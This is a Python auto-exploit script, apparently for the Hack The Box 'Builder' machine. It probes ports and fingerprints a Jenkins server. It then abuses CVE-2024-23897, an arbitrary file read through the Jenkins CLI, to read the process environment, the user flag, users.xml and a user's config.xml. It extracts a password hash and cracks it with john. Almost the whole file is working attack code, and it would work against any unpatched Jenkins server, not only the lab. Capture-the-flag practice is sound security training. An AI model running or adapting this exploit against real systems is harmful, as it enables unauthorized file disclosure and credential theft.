import requests
import sys
import subprocess
import os
import time
import socket

if len(sys.argv) != 2:
    print('Usage: python3 builder_autopwn.py <TARGET_MACHINE_IP>')
    sys.exit()

target_ip = sys.argv[1]
jenkins_site = f'http://{target_ip}:8080'
banner = '\n'+"="*50+'\n'

# Enumeration phase
print(banner)
print('[+] STARTING THE ENUMERATION PHASE...')
print(banner)

# Port Scanning

# Since I already scanned the ports using nmap, i'll use only the open ports to save time HAHAHAHAHAHA
COMMON_PORTS = [22,8080]

print(f'[*] Scanning for open ports on {target_ip}...\n')
for port in COMMON_PORTS:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((target_ip, port))
    if result == 0:
        print(f'[+] Port {port} is open\n')
        time.sleep(1)
    sock.close()

r = requests.get(jenkins_site)
title = r.text.split('<title>')[1].split('</title>')[0]
print(f'[+] Website title: {title}\n')
version = r.text.split('data-version="')[1].split('">')[0]
print(f"[+] Jenkins version in use: {version}\n")
print('[+] Jenkins version is vulnerable to CVE-2024-23897\n')


# Starting the exploitation based on this repo https://github.com/CKevens/CVE-2024-23897
print(banner)
print('[+] STARTING THE EXPLOIT...')
print(banner)

if not os.path.exists('jenkins-cli.jar'):
    print('[-] jenkins-cli.jar file not found.\n')
    print('[*] Fetching jenkins-cli.jar file. This will take a few seconds...\n')
    fetch_jar_file = ["wget", f"{jenkins_site}/jnlpJars/jenkins-cli.jar"]
    subprocess.run(fetch_jar_file, text=True,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print('[+] jenkins-cli.jar file fetched successfully.\n')
else:
    print('[+] Found "jenkins-cli.jar" file in the current directory.\n')

# Find the path to the home directory of the user that Jenkins is running as

command = ["java", "-jar", "jenkins-cli.jar", "-noCertificateCheck", "-s", jenkins_site, "help", "@/proc/self/environ"]
out = subprocess.run(command, text=True, capture_output=True)    
home_dir = out.stderr.split('HOME=')[2].split('LANG')[0]
home_dir = home_dir.replace('\x00', '')
print(f'[+] Found the home directory of the Jenkins user:   {home_dir}\n')

# Fetching user flag

print('[*] Fetching user flag...\n')
user_flag_path = f"@{home_dir}/user.txt"
command = ["java", "-jar", "jenkins-cli.jar", "-noCertificateCheck", "-s", jenkins_site, "help", user_flag_path]
out = subprocess.run(command, text=True, capture_output=True)
user_flag = out.stderr.split('command ')[2].split('.')[0]
print(f'[+] USER FLAG: {user_flag}\n')
time.sleep(1)

# Privilege Escalation part
print(banner)
print('[+] STARTING THE PRIVILEGE ESCALATION PHASE...')
print(banner)

print(f'[*] Trying to leak the user directory path by reading /var/jenkins_home/users/users.xml...\n')
command = ["java", "-jar", "jenkins-cli.jar", "-noCertificateCheck", "-s", jenkins_site, "connect-node", "@/var/jenkins_home/users/users.xml"]
out = subprocess.run(command, text=True, capture_output=True)   
user_home_dir = out.stderr.split('<string>')[1].split('</string>')[0]
print(f'[+] Found the user directory: {user_home_dir}\n')

print(f'[*] Extracting the hash for the user by reading users/{user_home_dir}/config.xml...\n')
path_to_config = f'@/var/jenkins_home/users/{user_home_dir}/config.xml'
command = ["java", "-jar", "jenkins-cli.jar", "-noCertificateCheck", "-s", jenkins_site, "connect-node", path_to_config]
out = subprocess.run(command, text=True, capture_output=True) 
password_hash = out.stderr.split('<passwordHash>')[1].split('</passwordHash>')[0]
print(f'[+] Found the password hash for the user: {password_hash}\n')
print('[+] Saving the hash to a file "hash"\n')
with open('hash', "w") as file:
    file.write(password_hash)

print(f'[*] Trying to crack the hash using john...')
command = ['john', 'hash', '--show']
out = subprocess.run(command, text=True, capture_output=True)
if '1 password hash cracked' in out.stdout:
    password = out.stdout.split(':')[1].split()[0]
    print(f'\n[+] Found the password for user jennifer: {password}\n')
else:
    wordlist = input('    Provide a wordlist: ')
    print('\n')
    command = ['john', 'hash', f'--wordlist={wordlist}']
    out = subprocess.run(command, text=True, capture_output=True)
    password = out.stdout.split('hashes')[1].split()[0]
    print(f'[+] Found the password for user jennifer: {password}\n')

print("[-] Aborting... Rest of the machine to be completed soon.")

